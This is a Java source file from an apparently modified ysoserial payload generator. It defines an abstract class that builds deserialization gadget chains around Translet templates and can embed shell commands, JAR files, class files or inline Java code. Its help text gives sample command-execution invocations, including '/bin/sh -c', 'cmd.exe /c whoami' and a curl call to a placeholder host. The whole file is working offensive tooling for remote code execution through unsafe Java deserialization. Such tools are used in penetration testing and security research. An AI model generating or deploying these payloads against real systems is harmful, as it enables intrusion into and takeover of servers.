package ysoserial.payloads;


import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.cli.*;
import ysoserial.Strings;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.Gadgets;

import java.io.*;
import java.util.Arrays;

public abstract class ParameterizedTransletObjectPayload<T> extends ParameterizedObjectPayload<T> {
    private static final Options CLI_OPTIONS = new Options()
        .addOption(Option.builder()
            .argName("jar-file")
            .longOpt("jar-file")
            .hasArg()
            .desc("Path to JAR file to inject inside the gadget chain. Arguments are passed to the static main method")
            .build())
        .addOption(Option.builder()
            .argName("class-file")
            .longOpt("class-file")
            .hasArg()
            .desc("Path to the pre-compiled class to add inside the gadget chain. Do not forget to add a static block initializer. The class name will be randomized")
            .build())
        .addOption(Option.builder()
            .argName("single")
            .longOpt("single")
            .hasArg()
            .desc("Provides a single command argument (old behavior)")
            .build())
        .addOption(Option.builder()
            .argName("jar-main")
            .longOpt("jar-main")
            .hasArg()
            .desc("Main class to use for the JAR file")
            .build())
        .addOption(Option.builder()
            .argName("inline")
            .longOpt("inline")
            .hasArg()
            .desc("Java code block to inject inside the gadget chain")
            .build())
        .addOption(Option.builder()
            .argName("inline-file")
            .longOpt("inline-file")
            .hasArg()
            .desc("Path to file that contains the Java code block to inject inside the gadget chain")
            .build())
        .addOption(Option.builder()
            .argName("help")
            .longOpt("help")
            .desc("Print this message")
            .build());

    @Override
    public String getHelp() {
        String header = "Payload based on internal Translet templates\r\narguments:";
        if(this.getClass().getAnnotation(Authors.class) != null) {
            header = "author(s): " + Strings.join(
                Arrays.asList(this.getClass().getAnnotation(Authors.class).value()),
                ", "
            ) + "\r\n" + header;
        }

        String examples = "examples: \r\n"
            + this.getClass().getSimpleName() + " -- /bin/sh -c 'id>/tmp/result.txt'\r\n"
            + this.getClass().getSimpleName() + " -- cmd.exe /c whoami\r\n"
            + this.getClass().getSimpleName() + " --single 'curl hxxp://foo.bar'\r\n"
            + this.getClass().getSimpleName() + " --inline 'System.out.println(\"Hello world\");'\r\n"
            + this.getClass().getSimpleName() + " --jar-file /path/to/app.jar --jar-main org.random.Main -- arg0 arg1 arg2\r\n"
            + this.getClass().getSimpleName() + " --jar-file /path/to/app.jar -- arg0 arg1 arg2";

        HelpFormatter formatter = new HelpFormatter();
        StringWriter sw = new StringWriter();
        formatter.printHelp(new PrintWriter(sw), 80,
            this.getClass().getSimpleName() + " [flags] -- [arguments ...]", header,
            CLI_OPTIONS, formatter.getLeftPadding(), formatter.getDescPadding(), examples,
            false);
        return sw.toString();
    }

    /***
     * New parameterized chain
     * @param args arguments to pass to the gadget
     * @return generated gadget chain
     * @throws Exception if error occurs
     */
    final public T getObject(String[] args) throws Exception {
        Object templates;

        CommandLine cline = new DefaultParser().parse(CLI_OPTIONS, args);
        if (cline.hasOption("help")) {
            throw new IllegalArgumentException(); //print help
        }
        else if (cline.hasOption("jar-file")) {
            if (cline.hasOption("jar-main")) {
                templates = Gadgets.createClassTemplatesImplFromJar(
                    cline.getOptionValue("jar-file"),
                    cline.getArgs(),
                    cline.getOptionValue("jar-main")
                );
            } else {
                templates = Gadgets.createClassTemplatesImplFromJar(
                    cline.getOptionValue("jar-file"),
                    cline.getArgs()
                );
            }
        } else if (cline.hasOption("class-file")) {
            ClassPool pool = ClassPool.getDefault();
            final CtClass clazz = pool.makeClass(
                new FileInputStream(cline.getOptionValue("class-file")));
            clazz.setName(Gadgets.generateRandomClassName());
            templates = Gadgets.createTemplatesImpl(
                "",
                new byte[][] { clazz.toBytecode()}
            );
        } else if (cline.hasOption("inline-file")) {
            StringBuilder code = new StringBuilder();
            BufferedReader reader = new BufferedReader(
                new FileReader(cline.getOptionValue("inline-file")));
            String line;
            while ((line = reader.readLine()) != null) {
                code.append(line).append("\r\n");
            }
            reader.close();
            templates = Gadgets.createTemplatesImplFromInline(code.toString());
        } else if (cline.hasOption("inline")) {
            templates = Gadgets.createTemplatesImplFromInline(cline.getOptionValue("inline"));
        } else if (cline.hasOption("single")) {
            templates = Gadgets.createTemplatesImpl(
                cline.getOptionValue("single")
            );
        } else {
            templates = Gadgets.createTemplatesImpl(
                cline.getArgs()
            );
        }

        return this.getObject(templates);
    }

    /**
     * Generate a new gadget chain from this translet tpl instance
     *
     * @param templates The parameterized translet template instance
     * @return generated gadget chain
     * @throws Exception if error occurs
     */
    abstract protected T getObject(final Object templates) throws Exception;

}
